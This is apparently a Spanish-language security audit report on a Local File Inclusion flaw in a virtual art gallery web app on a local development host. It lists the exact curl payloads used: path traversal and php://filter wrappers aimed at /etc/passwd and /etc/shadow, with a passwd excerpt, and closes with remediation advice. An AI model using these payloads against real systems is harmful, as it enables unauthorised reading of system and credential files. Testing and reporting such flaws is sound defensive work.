# Informe de Auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T12:47:07Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Se detectó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de /gallery.php.
- Se consiguió leer ficheros locales de la máquina web, incluyendo /etc/passwd.
- No fue posible leer /etc/shadow directamente (permiso denegado), aunque se confirmó el uso de php://filter.

Detalles técnicos:

1) Punto vulnerable
- URL: http://web.dev.local:8081/gallery.php
- Parámetro: page
- Confirmación: al pasar rutas con traversal (../../../../../../etc/passwd) el contenido de /etc/passwd se muestra en la respuesta HTML.

2) Comandos y payloads utilizados
- Reconocimiento inicial y petición de la página principal:
  - curl -s -D /tmp/headers.txt http://web.dev.local:8081 -o /tmp/homepage.html

- Fuzzing / prueba manual de LFI en el parámetro page:
  - curl -s "http://web.dev.local:8081/gallery.php?page=modern"
  - curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"  <-- lectura exitosa
  - curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd%00" <-- resultado: Página no encontrada
  - curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd" <-- lectura base64 dentro del HTML
  - curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/shadow" <-- no encontrado / denegado

3) Pruebas y evidencias
- Extracto de /etc/passwd mostrado en la respuesta:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  ...

- php://filter produce base64 que decodificado contiene también /etc/passwd.

4) Explotación adicional
- Se intentó leer /etc/shadow usando php://filter; la aplicación devolvió "archivo no existe".
- No se consiguió RCE ni extracción de claves SSH en esta fase.

Impacto:
- Recuperación de cuentas locales del sistema (usuarios) y potencial enumeración que facilita ataques posteriores.
- Si se consiguiera leer /etc/shadow o claves, riesgo crítico de escalada de privilegios.

Recomendaciones:
- Validar y sanitizar el parámetro "page" para permitir únicamente valores esperados (lista blanca).
- Evitar incluir archivos dinámicamente; usar mapeos seguros de nombres a rutas.
- Deshabilitar wrappers php:// cuando no sean necesarios y configurar open_basedir.
- Establecer permisos mínimos en ficheros sensibles (/etc/shadow) y aislar la aplicación en contenedores.

Evidencias y comandos exactos guardados en el directorio de trabajo.

Fin del informe.
